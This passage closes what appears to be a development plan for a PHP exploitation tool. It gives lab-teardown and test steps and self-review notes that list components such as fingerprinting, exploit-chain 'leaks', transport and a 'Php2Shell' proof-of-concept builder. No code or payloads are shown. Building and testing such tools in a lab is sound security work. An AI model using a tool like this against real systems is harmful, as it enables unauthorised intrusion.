- Stop and remove the lab containers; delete the temp lab directory and temp payloads.
- Run `git status --short`; assert only the intended source/docs/PHAR changes are tracked, with no lab/Docker/report artifacts.
- Run `composer test` one final time.
- If the lab exposed a bug, fix it with a new failing test, rerun the matrix, and commit the fix separately.

---

## Self-Review Notes

- **Spec coverage:** detection (Task 1), profile schema/catalog/plan/removal (Task 2), chain bodies/leaks (Task 3), transport (Task 4), orchestration/proof (Task 5), gates/CLI (Task 6), docs/PHAR (Task 7), lab matrix (Task 8).
- **Type consistency:** `Profile` accessors, `PocPlan` fields, `PhpFingerprint` methods, `Php2Shell` constructor, `Php2ShellPoc` signatures are repeated identically across tasks.
- **Review focus tests:** hidden version (Task 6 + Task 8 Step 4), closed preconditions (Task 6 + Task 8 Step 3), aarch64 selection (Task 6 + Task 8 Step 2), patched/FPM zero-payload (Task 6 + Task 8 Step 3), proof pre-existence/catch-all/wrong marker (Task 3/5 + Task 8 Step 3).
- **No placeholders:** the only deferred values are the implementation bodies, which the signatures, exact shapes and golden hashes determine.
